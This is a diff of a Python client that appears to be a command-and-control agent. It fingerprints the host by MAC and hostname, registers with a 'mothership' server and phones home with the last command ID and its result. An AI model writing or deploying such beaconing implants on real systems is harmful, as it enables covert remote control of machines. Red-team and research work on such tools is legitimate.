@@ -3,6 +3,7 @@ import threading
 import http.client
 import uuid
 import socket
+import time
 
 MAC = uuid.getnode()
 HOSTNAME = socket.gethostname()
@@ -15,6 +16,9 @@ LOCAL_PORT = 8001
 LOCAL_COMMS = False
 
 DEFAULT_DURATION = 5
+
+LAST_COMMAND_ID = "NONE"
+LAST_RESULT = "NONE"
 
 def main():
 
@@ -36,15 +40,15 @@ def main():
         
 def register():
 
-    params = f'{{"id": "{HOSTNAME}-{MAC}","group": "{HOSTNAME}-{MAC}", "hostname": "{HOSTNAME}", "mac": "{MAC}"}}'.encode()
-    return send_post_to_mothership("/squids/register/", params)
-
+    params = f'{{"sid": "{HOSTNAME}-{MAC}", "hostname": "{HOSTNAME}", "mac": "{MAC}"}}'
+    response =  send_post_to_mothership("/squids/register/", params)
+    return response
     
 def phone_home():
 
-    params = f'{{"caller": "{HOSTNAME}-{MAC}"}}'
-    return send_post_to_mothership("/squids/home/", params)
-  
+    params = f'{{"sid": "{HOSTNAME}-{MAC}", "cid": "{LAST_COMMAND_ID}", "result": "{LAST_RESULT}"}}'
+    response = send_post_to_mothership("/squids/home/", params)
+    return response
 
 def open_local_comms(local_ip, local_port):
 
